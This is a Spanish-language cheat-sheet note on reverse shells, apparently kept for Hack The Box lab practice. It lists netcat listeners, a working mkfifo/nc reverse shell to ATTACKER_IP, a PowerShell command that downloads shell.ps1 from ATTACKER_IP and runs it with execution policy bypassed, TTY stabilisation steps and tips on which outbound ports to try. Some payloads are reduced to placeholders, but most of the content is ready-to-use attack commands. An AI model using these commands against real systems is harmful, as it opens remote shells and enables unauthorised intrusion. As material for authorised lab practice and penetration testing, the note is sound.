---
title: Reverse Shells
tags: [htb, snippets, reverse-shells]
created: 2026-04-29
related:
  - "[[HTB/snippets/transfers|Transfers]]"
  - "[[HTB/snippets/one-liners|One-liners]]"
---

# Reverse Shells

> [!abstract] TL;DR
> Nota compacta y “Defender-safe”. Para payloads completos, usar PayloadsAllTheThings o revshells.com y reemplazar `ATTACKER_IP` / `PORT`.

## Listener

```bash
rlwrap -cAr nc -lvnp PORT
nc -lvnp PORT
```

## Linux: patrones

Bash TCP:

```text
bash -c '<bash interactive over /dev/tcp/ATTACKER_IP/PORT>'
```

Python PTY:

```text
python3 -c '<socket connect + dup2 + pty.spawn("/bin/bash")>'
```

mkfifo + nc:

```text
mkfifo /tmp/f; sh -i < /tmp/f 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

PHP command wrapper:

```text
PHP wrapper que ejecute un parámetro controlado como comando.
```

## Windows: patrones

PowerShell:

```powershell
iwr http://ATTACKER_IP:8000/shell.ps1 -OutFile C:\Windows\Temp\shell.ps1
powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\shell.ps1
```

Binario externo:

```text
Subir herramienta de reverse shell y ejecutarla contra ATTACKER_IP:PORT.
```

## Estabilizar TTY Linux

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 columns 120
```

En terminal local:

```bash
stty raw -echo; fg
```

## Tips

- Probar puertos permitidos: `80`, `443`, `53`, `8080`.
- Si reverse falla, probar bind, webshell o túnel.
- Revisar [[HTB/methodology/04-pivoting-tunneling|Pivoting & Tunneling]] si hay segmentación.

## Referencias rápidas

- PayloadsAllTheThings - Reverse Shells
- revshells.com
- GTFOBins
